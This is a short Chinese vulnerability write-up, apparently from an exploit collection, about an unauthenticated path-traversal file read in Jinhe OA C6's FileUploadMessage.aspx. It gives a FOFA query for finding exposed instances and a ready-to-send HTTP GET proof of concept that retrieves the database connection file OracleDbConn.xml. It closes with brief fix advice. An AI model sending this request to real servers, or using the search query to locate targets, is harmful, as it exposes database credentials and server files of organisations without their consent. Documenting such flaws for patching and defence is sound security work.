---
source: "R4gd0ll/I-Wanna-Get-All"
---

# 金和OA FileUploadMessage 任意文件读取漏洞

# 漏洞描述

金和OA C6 的 `JHSoft.WCF/FunctionNew/FileUploadMessage.aspx` 接口中 `filename` 参数存在目录遍历，導致任意文件读取漏洞。未授权的远程攻击者可读取服务器任意文件，例如数据库连接配置文件 `OracleDbConn.xml`。

影响范围

金和OA C6

# 漏洞复现

FOFA：app="金和网络-金和OA"

POC：

```
GET /C6/JHSoft.WCF/FunctionNew/FileUploadMessage.aspx?filename=../../../C6/JhSoft.Web.Dossier.JG/JhSoft.Web.Dossier.JG/XMLFile/OracleDbConn.xml HTTP/1.1
Host: target
```

`filename` 参数可替换为任意路径，响应直接返回文件内容。

# 修复方案

对 `filename` 参数做严格校验，禁止 `../` 等目录遍历字符；联系厂商获取官方补丁并升级。
